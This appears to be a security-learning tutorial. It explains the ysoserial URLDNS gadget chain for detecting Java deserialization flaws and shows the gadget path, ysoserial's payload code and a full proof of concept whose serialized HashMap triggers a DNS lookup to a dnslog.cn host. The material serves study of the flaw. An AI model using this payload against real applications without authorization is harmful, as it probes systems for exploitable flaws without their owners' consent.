# Java Security Learning—URLDNS Chain

Author: H3rmesk1t

# Preface
> `URLDNS` is a exploit chain in `ysoserial`, which is usually used to detect whether there is a `Java` deserialization vulnerability. This exploit chain has the following characteristics

```php
[1] The URLDNS utilization chain can only initiate DNS requests, and cannot perform other utilizations.
[2] No limit on jdk version, uses built-in Java classes, and no requirements for third-party dependencies
[3] The target has no echo, and it can be used to verify whether there is a deserialization vulnerability through DNS requests.
```

#Principle
> `java.util.HashMap` implements the `Serializable` interface, rewritten `readObject`, and the `hash` function of `key` is called when deserialized, while the `hashCode` of `java.net.URL` is called `getHostAddress` during calculation to resolve the domain name, thus issuing a `DNS` request.

# Analysis process
> Here we follow the `Gadget` of `URLDNS` in the `ysoserial` project to analyze

```java
Gadget Chain:
    HashMap.readObject()
    HashMap.putVal()
    HashMap.hash()
    URL.hashCode()
```
> Follow up on `HashMap` first and look at its own implemented `readObject()` function. Here, the `key` stored in `HashMap` is deserialized through `K key = (K) s.readObject();` through the `for` loop, and then call the `putVal()` and `hash()` functions.

<img src="./images/1.png" alt="">

> Follow up on the `hash()` function first to see how it is implemented. When `key!=null`, the `hashCode()` function will be called

<img src="./images/2.png" alt="">

> Follow up on the `hashCode()` function. Since the URLDNS in `ysoserial` uses the `URL` object, I follow up on the `java/net/URL.java` in the `Java` base class `URL`. Since the value of `hashCode` is defaulted to `-1`, `hashCode = handler.hashCode(this);`

<img src="./images/3.png" alt="">

> See how the `handler.hashCode()` function is implemented, here is a `Demo` code to debug

```java
import java.net.URL;

public class URLDemo {
    public static void main(String[] args) throws Exception {
        URL url = new URL("http://6ppzw1.dnslog.cn");
        url.hashCode();
    }
}
```
> First look at the result after the request, and successfully triggered the `DNS` request. Let's see how it is implemented

<img src="./images/4.png" alt="">

> Debugging and following up the `hashCode()` function in `java/net/URLStreamHandler.java`. You can see that a function `getHostAddress()` is called here to perform `DNS` parsing and returning the corresponding `IP`

<img src="./images/5.png" alt="">

> In ysoserial, it is triggered by the `put()` function. In fact, the implementation of this step is the same as before, and it is implemented by the `hash()` function.

<img src="./images/6.png" alt="">

> However, the above analysis process seems to have nothing to do with deserialization. In fact, when HashMap` passes in a URL object, it will perform a `DNS` parse, and HashMap` implements the `Serializable` interface and rewrites the `readObject` interface. That is to say, when a `Java` application has a deserialization vulnerability, you can pass in a serialized `HashMap` data (put the `URL` object as a `key` into the `HashMap`). When the incoming data reaches the deserialization vulnerability point of the `Java` application, the program will call the `readObject()` function overridden by HashMap to deserialize and read the data, and then trigger the `key.hashCode()` function to perform a `DNS` parse

# ysoserial project code analysis
> The URLDNS code in the ysoserial project is not that simple, and there are some other code snippets to see what these "extra" code are useful.

```java
public class URLDNS implements ObjectPayload<Object> {
        public Object getObject(final String url) throws Exception {
                URLStreamHandler handler = new SilentURLStreamHandler();
                HashMap ht = new HashMap();
                URL u = new URL(null, url, handler);
                ht.put(u, url);
                Reflections.setFieldValue(u, "hashCode", -1);
                return ht;
        }
        public static void main(final String[] args) throws Exception {
                PayloadRunner.run(URLDNS.class, args);
        }
        static class SilentURLStreamHandler extends URLStreamHandler {

                protected URLConnection openConnection(URL u) throws IOException {
                        return null;
                }
                protected synchronized InetAddress getHostAddress(URL u) {
                        return null;
                }
        }
}
```
> Here we inherit the `URLStreamHandler` class and rewrite the `openConnection()` and `getHostAddress()` functions. The purpose of rewriting here is: when `HashMap#put`, we will also call the `getHostAddress()` function for a `DNS` resolution. Here we overwrite the original function through the `getHostAddress()` function, so that it does not perform `DNS` resolution, and avoid `DNS` resolution when `Payload` is created.

> The `setFieldValue()` function in code `Reflections.setFieldValue(u, "hashCode", -1);` is a function in a reflection class customized by the `ysoserial` project.

```java
public class Reflections {
    public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        field.set(obj, value);
    }
}
```
> The above code sets the value of the `hashCode` of the `URL` class to `-1` by reflection. This is because the `hashCode()` function has been called once when `HashMap#put`. The value of `hashCode` will no longer be `-1`. This will cause the `hashCode` value to be directly returned when deserialized by the `HashMap` readObject()` function, and no longer calls `handler.hashCode(this)`. Therefore, reflection is used to set the `hashCode` value to `-1`

> Finally, use `PayloadRunner.run()` to deserialize

## POC chain

```java
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.
util.Date;
import java.util.HashMap;

public class URLDemo {

    public static void main(String[] args) throws Exception {
        Date nowTime = new Date();
        HashMap hashmap = new HashMap();
        URL url = new URL("http://lttx9f.dnslog.cn");
        SimpleDateFormat simpleDateFormat = new SimpleDateFormat("yyyy-MM-dd hh:mm:ss");
        Field filed = Class.forName("java.net.URL").getDeclaredField("hashCode");
        filed.setAccessible(true); // Bypass the permissions to check Java language permission control
        filed.set(url, 209);
        hashmap.put(url, 209);
        System.out.println("The current time is: " + simpleDateFormat.format(nowTime));
        filed.set(url, -1);

        try {
            FileOutputStream fileOutputStream = new FileOutputStream("./dnsser");
            ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
            objectOutputStream.writeObject(hashmap);
            objectOutputStream.close();
            fileOutputStream.close();

            FileInputStream fileInputStream = new FileInputStream("./dnsser");
            ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);
            objectInputStream.readObject();
            objectInputStream.close();
            fileInputStream.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

> From the request result, it can be seen that in the `Payload` generation stage, no `DNS` resolution is initiated, but a request is made during the subsequent deserialization process.

<img src="./images/7.png" alt="">